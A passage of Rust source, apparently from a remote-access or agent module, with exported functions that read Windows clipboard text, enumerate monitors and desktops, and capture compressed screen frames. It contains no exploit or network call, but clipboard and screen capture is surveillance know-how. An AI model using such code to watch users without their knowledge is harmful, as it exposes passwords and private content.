    let clipboard_mem = GlobalLock(clipboard_handle);
    if clipboard_mem.is_null() {
        CloseClipboard();
        return -2; // Failed to lock clipboard memory
    }

    let mut len: usize = 0;
    const MAX_CLIPBOARD_SIZE: usize = 10 * 1024 * 1024; // 10MB safety limit
    
    loop {
        if len >= MAX_CLIPBOARD_SIZE {
            break;
        }
        let word = *((clipboard_mem as *const u16).add(len / 2));
        if word == 0 {
            break;
        }
        len += 2;
    }

    GlobalUnlock(clipboard_handle);
    CloseClipboard();

    if len == 0 {
        *out_size = 0;
        *out = 0;
        return 0;
    }

    let tmp = VirtualAlloc(std::ptr::null(), len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) as *mut u8;
    if tmp.is_null() {
        return -3; // Failed to allocate output memory
    }
    
    let status = OpenClipboard(hwnd);
    if status == 0 {
        return -4;
    }
    
    let clipboard_handle = GetClipboardData(clipboard_format::CF_UNICODETEXT as u32);
    if !clipboard_handle.is_null() {
        let clipboard_mem = GlobalLock(clipboard_handle);
        if !clipboard_mem.is_null() {
            ptr::copy_nonoverlapping(clipboard_mem as *const u8, tmp, len);
            GlobalUnlock(clipboard_handle);
        }
    }
    CloseClipboard();

    *out_size = len;
    ptr::write(out, tmp as usize);
    0
}


#[unsafe(no_mangle)]
pub unsafe fn monitors(flags: *mut u16,label:u32,input: *const usize,input_size:usize,out: *mut usize,out_size: *mut usize) -> i32 {
    let (desktop_name, is_input_desktop) = desktop::current_desktop().unwrap_or_default();
    
    desktop::update_cached_desktop_state(desktop_name.clone(), !is_input_desktop);
    
    let monitors = monitors::get_monitors().unwrap();
    let mut json_output = String::new();
    
    json_output += &format!(r#"{{"desktop":{{"name":"{}","is_input_desktop":{}}},"#, 
        desktop_name.trim_end_matches('\0'),
        is_input_desktop);
    
    json_output += r#""monitors":["#;
    for (i, monitor) in monitors.iter().enumerate() {
        json_output = json_output + &format!(r#"{{"name":"{}","device_name":"{}","device_string":"{}","device_id":"{}","model_name":"{}","manufacturer":"{}","state_flags":{},"is_virtual":{},"is_primary":{},"monitor_rect":{{"left":{},"top":{},"right":{},"bottom":{}}},"work_rect":{{"left":{},"top":{},"right":{},"bottom":{}}}}}"#,
            monitor.name.replace(r#"\\.\"#, ""),
            monitor.device_name.replace(r#"\"#, r#"\\"#),
            monitor.device_string,
            monitor.device_id.replace(r#"\"#, r#"\\"#),
            monitor.model_name,
            monitor.manufacturer,
            monitor.state_flags,
            monitor.is_virtual,
            monitor.is_primary,
            monitor.monitor_rect.left,
            monitor.monitor_rect.top,
            monitor.monitor_rect.right,
            monitor.monitor_rect.bottom,
            monitor.work_rect.left,
            monitor.work_rect.top,
            monitor.work_rect.right,
            monitor.work_rect.bottom
        );
        if i < monitors.len() - 1 {
            json_output = json_output + ",";
        }
    }
    json_output = json_output + "]}";
    write_string_to_memory_as_utf16(out, out_size, json_output);
    0
}

/*
| 2 bytes | 4 bytes | 4 bytes | n bytes               |
| flags   | width   | height  | optional monitor name |
*/

#[unsafe(no_mangle)]
pub unsafe fn framebuffer(flags: *mut u16,label:u32,input: *const usize,input_size:usize,out: *mut usize,out_size: *mut usize) -> i32 {
    let d:Vec<u8> = slice::from_raw_parts(input as *const _, input_size).to_vec();
    let flags =  u16::from_le_bytes(d[0..2].try_into().unwrap());
    let viewer_width = u32::from_le_bytes(d[2..6].try_into().unwrap());
    let viewer_height = u32::from_le_bytes(d[6..10].try_into().unwrap());

    let mut keyframe:bool = false;
    if flags != 0 {
        keyframe = true;
    }

    #[cfg(debug_assertions)]
    {
        println!("keyframe: {}",keyframe);
    }

    let (_,is_input_dekstop) = desktop::current_desktop().unwrap();
    let diff_result = if is_input_dekstop {
            let resource_name:String = if input_size > 10 {
                String::from_utf16(slice::from_raw_parts(input.byte_add(10) as *const u16, (input_size-10) / 2)).unwrap()
            } else {
                "".to_string()
            };

            #[cfg(debug_assertions)]
            {
                println!("monitor/resource name: {}",resource_name);
            }

        let mi = monitors::available_monitors_get_k(resource_name);
        if mi.is_some() {
            let monitor = mi.unwrap();
            set_capture_offset(monitor.monitor_rect.left, monitor.monitor_rect.top);
            set_capture_dimensions(monitor.monitor_rect.right-monitor.monitor_rect.left, monitor.monitor_rect.bottom-monitor.monitor_rect.top);
            screenshot::screenshot_with_diff(Some(monitor), viewer_width, viewer_height,keyframe)
        } else {
            #[cfg(debug_assertions)]
            {
                println!("No monitor/resource found with that name");
            }
            return 0;
        }
    } else {
        screenshot::screenshot_with_diff(None, viewer_width, viewer_height,keyframe)
    };
    
    match diff_result {
        Some(diff_result) => {
            let (jpeg_data, jpeg_width, jpeg_height) = screenshot::encode_rgb_to_jpeg(&diff_result.diff_image, diff_result.width, diff_result.height, 50).unwrap();

            let mut body_buf:Vec<u8> = vec![0;jpeg_data.len() + diff_result.tile_offsets.len() * 4 + 10];
            body_buf[0..4].copy_from_slice(&(jpeg_width).to_le_bytes());
            body_buf[4..8].copy_from_slice(&(jpeg_height).to_le_bytes());
            body_buf[8..10].copy_from_slice(&(diff_result.tile_offsets.len() as u16).to_le_bytes());
            
            for (idx, tile_offset) in diff_result.tile_offsets.iter().enumerate() {
                let offset = 10 + idx * 4;
                body_buf[offset..offset+2].copy_from_slice(&(tile_offset.x).to_le_bytes());
                body_buf[offset+2..offset+4].copy_from_slice(&(tile_offset.y).to_le_bytes());
            }

            body_buf[10 + diff_result.tile_offsets.len() * 4 ..].copy_from_slice(&jpeg_data);

            *out_size = body_buf.len();
            let tmp = VirtualAlloc(std::ptr::null(), *out_size, MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE) as *mut u8;
            ptr::copy_nonoverlapping(body_buf.as_ptr() as *const u8, tmp, *out_size);
            ptr::write(out, tmp as usize);
            0
        },
        None => {
           0
        },
    }
}





/*
    if directory_handle as usize == 0xffffffffffffffff  {
        let error_out = output_last_error(None);
        let error_out:Vec<u16> = error_out.encode_utf16().collect();

        *out_size = error_out.len() * 2;
        let tmp = VirtualAlloc(std::ptr::null(), *out_size, MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE) as *mut u8;
        ptr::copy_nonoverlapping(error_out.as_ptr() as *const u8, tmp, *out_size);
        ptr::write(out, tmp as usize);

        *flags = 1|16;
        return 0
    }
*/

pub fn output_module_error(error:String) -> String {
    format!(r#"{{"message":"{}","code":{},"context":"","hex_encoded":true}}"#,hex_encode(&error),0)
}

/*
//{"message":"","code":0,"context":"","hex_encoded":bool}
pub fn output_last_error(error_context:Option<String>) -> String {
    unsafe {
    let dw = GetLastError();

    let mut output_addr:usize = 0;
    let lpmsg:*mut usize = &mut output_addr;

    let s = FormatMessageW(FORMAT_MESSAGE_ALLOCATE_BUFFER|FORMAT_MESSAGE_FROM_SYSTEM|FORMAT_MESSAGE_IGNORE_INSERTS,
        std::ptr::null(),
        dw,
        0x400,//MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT)
        lpmsg as _,
        0,
        std::ptr::null(),
    );

    let out = String::from_utf16(slice::from_raw_parts(output_addr as _, s as usize)).unwrap();
    LocalFree(output_addr as _);
    match error_context {
        Some(error_context) => {format!(r#"{{"message":"{}","code":{},"context":"{}","hex_encoded":true}}"#,hex_encode(&out),dw,hex_encode(&error_context))},
        None => {format!(r#"{{"message":"{}","code":{},"context":"","hex_encoded":true}}"#,hex_encode(&out),dw)},
    }
    }
}
*/